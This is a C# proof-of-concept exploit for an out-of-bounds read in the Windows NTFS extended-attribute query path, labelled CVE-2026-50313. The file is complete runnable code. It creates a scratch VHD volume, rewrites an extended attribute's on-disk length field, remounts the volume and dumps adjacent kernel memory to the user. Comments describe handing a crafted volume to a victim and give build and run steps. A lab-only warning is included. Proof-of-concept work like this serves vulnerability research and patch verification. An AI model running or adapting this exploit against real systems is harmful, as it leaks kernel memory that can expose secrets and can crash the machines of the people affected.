// ntfs_ea_oob_poc.cs
//
// CVE-2026-50313 (July 2026 NTFS cluster) - proof of concept
// Out-of-bounds read (CWE-125) in Ntfs!NtfsQueryEaSimpleScan.
//
// The bug
// -------
// NtfsQueryEaSimpleScan copies each $EA entry into the caller's buffer with a
// length of  9 + EaNameLength + EaValueLength  taken straight from the on-disk
// entry, without checking that the entry actually fits inside the mapped $EA
// stream. EaValueLength is attacker-controlled on a crafted volume, so an
// unprivileged NtQueryEaFile against a file on that volume copies adjacent
// kernel paged-pool memory back into a user-mode buffer.
//
// What this program does, start to finish, with no debugger anywhere in the
// trigger path:
//
//   1. creates a small scratch NTFS volume in a VHD (diskpart)
//   2. writes one ordinary extended attribute, MAGICEA_ = 16 x 'A', to a file
//      on it, using NtSetEaFile
//   3. detaches the VHD, so the volume is just a file full of raw NTFS
//   4. finds every on-disk copy of that EA entry (MFT record, $MFTMirr, and
//      $LogFile) and rewrites EaValueLength from 0x0010 to the requested size
//   5. reattaches the VHD and calls NtQueryEaFile
//   6. hex-dumps what came back
//
// Everything past step 4 is what an attacker gets for free by handing someone a
// volume: mount it, read a file's attributes, receive kernel memory. Bytes past
// offset 0x21 of the dump are out-of-bounds kernel pool.
//
// Build (in-guest, no toolchain needed):
//   %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /unsafe ^
//       /out:ntfs_ea_oob_poc.exe ntfs_ea_oob_poc.cs
//
// Run elevated (diskpart needs it):
//   ntfs_ea_oob_poc.exe [--leak 0x400] [--dir C:\eapoc] [--out leak.txt] [--keep]
//
// --leak is the value written over EaValueLength. It is a USHORT on disk, so
// 0xFFFF is the ceiling and yields a 64 KB read. Tested on Windows 11 22H2
// 22621.6060; the same unpatched NtfsQueryEaSimpleScan is present there.
//
// Lab use only. This mounts a deliberately corrupt filesystem; run it in a VM
// you can revert. A large enough --leak can walk off the end of the mapped
// region and bugcheck the machine (0x50 PAGE_FAULT_IN_NONPAGED_AREA).

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class NtfsEaOobPoc
{
    [StructLayout(LayoutKind.Sequential)]
    struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa,
                                     uint disp, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool FlushFileBuffers(IntPtr h);

    [DllImport("ntdll.dll")]
    static extern int NtSetEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len);

    [DllImport("ntdll.dll")]
    static extern int NtQueryEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len,
                                    bool single, IntPtr eaList, int eaListLen,
                                    IntPtr eaIndex, bool restart);

    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    const uint FILE_SHARE_ALL = 0x7;
    const uint CREATE_ALWAYS = 2, OPEN_EXISTING = 3;
    const uint FLAG_BACKUP = 0x02000000;   // FILE_FLAG_BACKUP_SEMANTICS
    const uint FLAG_WRITE_THROUGH = 0x80000000;

    const string EaName = "MAGICEA_";
    const ushort EaValueLenOriginal = 0x0010;
    const string VolumeLabel = "POCVOL";
    const char DriveLetter = 'W';
    const string TestFile = "eatest.dat";

    static StringBuilder log = new StringBuilder();

    static void Say(string s)
    {
        Console.WriteLine(s);
        log.AppendLine(s);
    }

    // ---------------------------------------------------------------- diskpart

    static string DiskPart(string script)
    {
        string tmp = Path.Combine(Path.GetTempPath(), "dp_" + Guid.NewGuid().ToString("N") + ".txt");
        File.WriteAllText(tmp, script);
        try
        {
            var psi = new ProcessStartInfo("diskpart.exe", "/s \"" + tmp + "\"");
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;
            using (var p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                return o;
            }
        }
        finally { try { File.Delete(tmp); } catch { } }
    }

    static void CreateVolume(string vhd)
    {
        Say("[1] creating scratch NTFS volume in " + vhd);
        string o = DiskPart(
            "create vdisk file=\"" + vhd + "\" maximum=32 type=fixed\n" +
            "select vdisk file=\"" + vhd + "\"\n" +
            "attach vdisk\n" +
            "create partition primary\n" +
            "format fs=ntfs quick label=" + VolumeLabel + "\n" +
            "assign letter=" + DriveLetter + "\n");
        if (o.IndexOf("successfully", StringComparison.OrdinalIgnoreCase) < 0)
            throw new Exception("diskpart create failed:\n" + o);
        Say("    volume mounted at " + DriveLetter + ":  (label " + VolumeLabel + ")");
    }

    static void Attach(string vhd)
    {
        DiskPart("select vdisk file=\"" + vhd + "\"\nattach vdisk\n");
        // The partition normally comes back with its old letter; assign anyway
        // in case it did not, and ignore the failure if it already has one.
        DiskPart("select vdisk file=\"" + vhd + "\"\nselect partition 1\nassign letter=" + DriveLetter + "\n");
        System.Threading.Thread.Sleep(1500);
    }

    static void Detach(string vhd)
    {
        DiskPart("select vdisk file=\"" + vhd + "\"\ndetach vdisk\n");
        System.Threading.Thread.Sleep(800);
    }

    // ------------------------------------------------------------ EA set/query

    // FILE_FULL_EA_INFORMATION:
    //   ULONG NextEntryOffset; UCHAR Flags; UCHAR EaNameLength;
    //   USHORT EaValueLength;  CHAR EaName[EaNameLength+1]; value
    static void SetEa(string path)
    {
        Say("[2] writing one ordinary EA: " + EaName + " = 16 x 'A'");
        IntPtr h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_ALL,
                               IntPtr.Zero, CREATE_ALWAYS,
                               FLAG_BACKUP | FLAG_WRITE_THROUGH, IntPtr.Zero);
        if (h.ToInt64() == -1)
            throw new Exception("CreateFile(" + path + ") failed, gle=" + Marshal.GetLastWin32Error());
        try
        {
            byte nl = (byte)EaName.Length;
            ushort vl = EaValueLenOriginal;
            int entry = ((4 + 1 + 1 + 2 + (nl + 1) + vl) + 3) & ~3;
            byte[] ea = new byte[entry];
            ea[5] = nl;
            ea[6] = (byte)(vl & 0xff);
            ea[7] = (byte)(vl >> 8);
            for (int i = 0; i < nl; i++) ea[8 + i] = (byte)EaName[i];
            for (int i = 0; i < vl; i++) ea[8 + nl + 1 + i] = 0x41;

            IO_STATUS_BLOCK io = new IO_STATUS_BLOCK();
            int st = NtSetEaFile(h, ref io, ea, ea.Length);
            if (st != 0) throw new Exception("NtSetEaFile = 0x" + st.ToString("X8"));
            FlushFileBuffers(h);
            Say("    NtSetEaFile = 0x00000000");
        }
        finally { CloseHandle(h); }
    }

    static void QueryEa(string path, int bufLen, ushort leak)
    {
        Say("[5] calling NtQueryEaFile with a " + bufLen + "-byte buffer");
        IntPtr h = CreateFileW(path, GENERIC_READ, FILE_SHARE_ALL, IntPtr.Zero,
                               OPEN_EXISTING, FLAG_BACKUP, IntPtr.Zero);
        if (h.ToInt64() == -1)
            throw new Exception("CreateFile(" + path + ") failed, gle=" + Marshal.GetLastWin32Error());
        try
        {
            byte[] buf = new byte[bufLen];
            IO_STATUS_BLOCK io = new IO_STATUS_BLOCK();
            int q = NtQueryEaFile(h, ref io, buf, bufLen, false, IntPtr.Zero, 0, IntPtr.Zero, true);
            long info = io.Information.ToInt64();

            Say("");
            Say("    NtQueryEaFile  = 0x" + q.ToString("X8"));
            Say("    bytesReturned  = " + info + " (0x" + info.ToString("X") + ")");
            Say("    entry header   = 8 bytes + \"" + EaName + "\" + NUL + value");
            Say("    in bounds      = 0x00 .. 0x21   (the real 16-byte value ends here)");
            Say("    OUT OF BOUNDS  = 0x22 .. 0x" + (info - 1).ToString("X") +
                "   <-- adjacent kernel paged pool");
            Say("");

            int dump = (int)Math.Min(info > 0 ? info : 64, bufLen);
            HexDump(buf, dump);

            if (info > 0x21)
                Say("\n[+] LEAKED " + (info - 0x22) + " bytes of kernel memory past the EA value.");
            else
                Say("\n[-] no over-read: returned " + info + " bytes (patch present, or the " +
                    "volume was repaired on mount)");
        }
        finally { CloseHandle(h); }
    }

    static void HexDump(byte[] b, int len)
    {
        for (int i = 0; i < len; i += 16)
        {
            var sb = new StringBuilder();
            sb.Append(i.ToString("X4")).Append(": ");
            for (int j = 0; j < 16; j++)
                sb.Append(i + j < len ? b[i + j].ToString("X2") + " " : "   ");
            sb.Append(' ');
            for (int j = 0; j < 16 && i + j < len; j++)
            {
                byte c = b[i + j];
                sb.Append(c >= 0x20 && c < 0x7f ? (char)c : '.');
            }
            log.AppendLine(sb.ToString());
            Console.WriteLine(sb.ToString());
        }
    }

    // ------------------------------------------------------------- the patch

    // On disk the EA entry keeps the same layout, so the three bytes
    //   EaNameLength(08) EaValueLength(10 00)
    // sit immediately in front of the name. Rewriting EaValueLength is the whole
    // attack: it is what the copy length is derived from and what nothing
    // validates.
    static int PatchEaValueLength(string vhd, ushort newLen)
    {
        Say("[4] patching EaValueLength 0x" + EaValueLenOriginal.ToString("X4") +
            " -> 0x" + newLen.ToString("X4") + " in the raw volume");

        byte[] b = File.ReadAllBytes(vhd);
        byte[] name = Encoding.ASCII.GetBytes(EaName);
        byte[] pat = new byte[3 + name.Length];
        pat[0] = (byte)EaName.Length;
        pat[1] = (byte)(EaValueLenOriginal & 0xff);
        pat[2] = (byte)(EaValueLenOriginal >> 8);
        Array.Copy(name, 0, pat, 3, name.Length);

        int hits = 0;
        for (int i = 0; i <= b.Length - pat.Length; i++)
        {
            int j = 0;
            while (j < pat.Length && b[i + j] == pat[j]) j++;
            if (j != pat.Length) continue;

            b[i + 1] = (byte)(newLen & 0xff);
            b[i + 2] = (byte)(newLen >> 8);
            hits++;
            Say("    hit " + hits + " at file offset 0x" + i.ToString("X"));
        }

        if (hits == 0) throw new Exception("EA entry not found in the image");
        File.WriteAllBytes(vhd, b);
        Say("    patched " + hits + " cop" + (hits == 1 ? "y" : "ies") +
            " (MFT record, $MFTMirr, $LogFile)");
        return hits;
    }

    // ------------------------------------------------------------------ main

    static int Main(string[] argv)
    {
        ushort leak = 0x0400;
        string dir = @"C:\eapoc";
        string outFile = null;
        bool keep = false;

        for (int i = 0; i < argv.Length; i++)
        {
            switch (argv[i])
            {
                case "--leak": leak = ParseNum(argv[++i]); break;
                case "--dir":  dir = argv[++i]; break;
                case "--out":  outFile = argv[++i]; break;
                case "--keep": keep = true; break;
                default:
                    Console.WriteLine("usage: ntfs_ea_oob_poc.exe [--leak 0x400] " +
                                      "[--dir C:\\eapoc] [--out leak.txt] [--keep]");
                    return 2;
            }
        }
        if (leak <= EaValueLenOriginal)
        {
            Console.WriteLine("--leak must be larger than 0x10 to over-read");
            return 2;
        }

        string vhd = Path.Combine(dir, "poc.vhd");
        string file = DriveLetter + @":\" + TestFile;

        Say("CVE-2026-50313 - Ntfs!NtfsQueryEaSimpleScan out-of-bounds read");
        Say("EaValueLength 0x" + EaValueLenOriginal.ToString("X4") +
            " -> 0x" + leak.ToString("X4") + "   (expect ~" + (leak + 0x11) + " bytes back)");
        Say(new string('-', 70));

        bool created = false;
        try
        {
            Directory.CreateDirectory(dir);
            if (File.Exists(vhd)) File.Delete(vhd);

            CreateVolume(vhd);
            created = true;

            SetEa(file);

            Say("[3] detaching the volume");
            Detach(vhd);

            PatchEaValueLength(vhd, leak);

            Say("    reattaching");
            Attach(vhd);
            if (!File.Exists(file))
                throw new Exception("volume did not come back at " + DriveLetter + ":");

            QueryEa(file, leak + 0x1000, leak);
            return 0;
        }
        catch (Exception e)
        {
            Say("\n[!] " + e.Message);
            return 1;
        }
        finally
        {
            if (created && !keep)
            {
                Detach(vhd);
                try { File.Delete(vhd); } catch { }
                Say("\n[*] volume detached and deleted");
            }
            if (outFile != null)
            {
                try { File.WriteAllText(outFile, log.ToString()); Console.WriteLine("wrote " + outFile); }
                catch { }
            }
        }
    }

    static ushort ParseNum(string s)
    {
        s = s.Trim();
        if (s.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
            return Convert.ToUInt16(s.Substring(2), 16);
        return ushort.Parse(s);
    }
}
